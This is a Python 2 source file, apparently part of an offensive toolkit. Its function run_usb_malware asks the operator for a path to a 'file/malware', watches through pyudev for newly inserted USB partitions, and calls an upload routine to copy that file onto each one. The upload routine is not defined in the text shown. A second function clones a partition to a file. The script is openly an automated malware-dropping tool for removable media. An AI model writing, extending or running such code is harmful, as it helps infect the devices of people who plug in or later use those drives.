import pyudev
from time import sleep
import platform
import sys
import os
import subprocess
import shutil
import time
import random
from appearance.hue import *
from appearance.error_handling import *
import errno
#dest = '/home/filip/Desktop/DSCN0027.jpg'
def clone_partition(addr):
	global dest
	print("Cloning {} > {}").format(addr,dest)
	try:
		shutil.copyfile(addr, dest)
		return 0
	except KeyboardInterrupt:
		print("Interrupted...")
	except Exception as e:
		f = open('Error'+str(random.getrandbits(10))+'.log', 'w+')
		f.write(str(time.ctime())+'\n'+str(e)+'\n')
		f.close()
		print("Device Clone Interruption at {}").format(time.ctime())
		return 1

def run_usb_malware():
    global dest
    print (info("Please type the full path of the file/malware to copy onto the device"))
    dest = raw_input(que("Path to file: ")) #'/home/filip/Desktop/DSCN0027.jpg'
    num = random.randint(1,101)
    #dest = "output/usb-output-" + str(num) #raw_input(que('Where to copy files: '))
    context = pyudev.Context()
    monitor = pyudev.Monitor.from_netlink(context)
    monitor.filter_by(subsystem='block')

    current_partitions = []
    for device in context.list_devices(subsystem='block'):
        if(device.device_node not in current_partitions):
            print(info("Found device {} at Memory Location: {}").format(device.device_node, hex(id(device.device_node))))
            current_partitions.append(device.device_node)

    print(run("Waiting for a partition/USB device..."))
    for device in iter(monitor.poll, None):
        try:
            if device.action == 'add':
                if device.device_type == "partition":
                    print (info("Detected disk/partition: {}".format(device.device_node)))
                    #print(device.get('ID_FS_LABEL', 'unlabeled partition'))
                    data = upload_malware(device.device_node)
                    if(data == 1):
                        print(bad("The process was unsucessfully initiated on {} ").format(device.device_node))
                        break
                    elif(data == 2):
                        print(info("The process was successfully completed but could not dismount {} ").format(device.device_node))
                        break
                    elif(data == 0):
                        print(good("The process was completed successfully on {} ").format(device.device_node))
                        break
                else:
                    print (bad("Type disk detected but not a partition... moving on"))
            elif device.action == "remove":
                print (info("USB device removed"))
                continue
        except Exception as e:
            print (bad("Something happened! Printing error: "))
            print (e)
            run_error_handling(e)
            return
